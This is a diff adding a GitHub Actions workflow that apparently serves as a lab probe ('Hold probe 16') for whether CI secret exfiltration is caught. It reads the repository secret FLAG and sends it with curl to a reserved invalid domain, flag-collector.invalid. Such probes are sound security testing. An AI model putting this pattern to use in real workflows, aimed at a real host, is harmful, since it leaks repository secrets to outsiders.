@@ -1,0 +1,23 @@
+name: Hold probe 16 - FLAG direct egress
+
+on:
+  push:
+    branches:
+      - case-16-flag-direct-egress
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Attempt FLAG transfer to a reserved invalid domain
+        env:
+          FLAG: ${{ secrets.FLAG }}
+        run: |
+          curl --fail --max-time 3 \
+            --data-urlencode "flag=${FLAG}" \
+            https://flag-collector.invalid/ingest || true
+          printf '%s\n' 'HOLD_LAB_CASE=flag-direct-egress'
